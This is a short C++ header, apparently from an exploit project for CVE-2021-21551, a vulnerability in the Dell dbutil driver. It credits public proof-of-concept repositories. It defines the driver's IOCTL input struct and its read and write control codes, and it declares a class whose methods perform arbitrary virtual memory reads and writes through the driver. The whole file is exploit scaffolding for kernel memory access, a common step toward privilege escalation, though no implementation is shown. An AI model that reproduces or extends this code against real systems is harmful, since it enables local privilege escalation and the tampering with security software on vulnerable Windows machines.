#pragma once
#include <Windows.h>

// thanks homies <3
// https://github.com/mathisvickie/CVE-2021-21551/blob/main/CVE-2021-21551.c
// https://github.com/mzakocs/CVE-2021-21551-POC/
// https://connormcgarr.github.io/cve-2020-21551-sploit/

// struct from: https://github.com/mathisvickie/CVE-2021-21551/blob/main/CVE-2021-21551.c#L61
//this struct is based on reverse engineering exploited driver
typedef struct _IOCTL_STRUCT
{
	ULONGLONG unk0;
	PCHAR address;
	ULONGLONG zero; //value added to address so always set it to zero for 'linearity'
	PCHAR value;
} IOCTL_STRUCT, *PIOCTL_STRUCT;


class DBUtilMem
{
public:
	HANDLE hDevice;
	BOOL VirtRead(PVOID lpAddr);
	BOOL VirtWrite(PVOID lpAddr, DWORD64 qwValue);
	BOOL Connect();
private:
	const DWORD IOCTL_READ = 0x9b0c1ec4;
	const DWORD IOCTL_WRITE = 0x9b0c1ec8;
};

